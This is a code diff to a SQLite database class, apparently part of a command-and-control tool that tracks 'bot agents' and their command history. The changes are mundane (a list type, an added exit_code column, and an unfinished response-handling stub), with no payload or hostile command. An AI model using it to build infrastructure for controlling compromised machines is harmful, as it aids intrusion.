@@ -13,7 +13,7 @@ class CommanderDatabase:
         self.db_name = "commander.db"
         self.db_fp = os.path.join(self.db_path, self.db_name)
         self.bulk_timer = time.time()
-        self.bulk_response = {}
+        self.bulk_response = []
         self.pending = False
         self.db_init()
 
@@ -44,7 +44,7 @@ class CommanderDatabase:
             (id TEXT PRIMARY KEY, hostname TEXT, address TEXT, online INTEGER, os TEXT);
             CREATE TABLE IF NOT EXISTS CommandHistory
             (count INTEGER PRIMARY KEY AUTOINCREMENT, time TEXT, id TEXT, event TEXT, event_detail TEXT, response TEXT,
-             FOREIGN KEY (id) REFERENCES BotAgents (id));
+             exit_code TEXT, FOREIGN KEY (id) REFERENCES BotAgents (id));
             ''')
         return self.query_wrapper("executescript", "CREATE", query)
 
@@ -78,14 +78,14 @@ class CommanderDatabase:
     def add_agent_events(self, uuid_list, event, event_detail):
         data = list(zip([time.time(), ] * len(uuid_list), uuid_list, [event, ] * len(uuid_list), [event_detail, ] * len(uuid_list)))
         query = "INSERT INTO CommandHistory(time, id, event, event_detail) VALUES (?, ?, ?, ?)"
-        self.pending = True
-        return self.query_wrapper("executemany", "INSERT", query, params=data)
+        rows_affected = self.query_wrapper("executemany", "INSERT", query, params=data)
+        return rows_affected
 
     def add_event_responses(self, uuid_list, event, event_detail):
 
-        self.bulk_response = {}
         if self.check_if_pending():
-
+            #INSERT AND REINITIALIZE BULK
+            self.bulk_response = []
         return
 
     def check_if_pending(self):
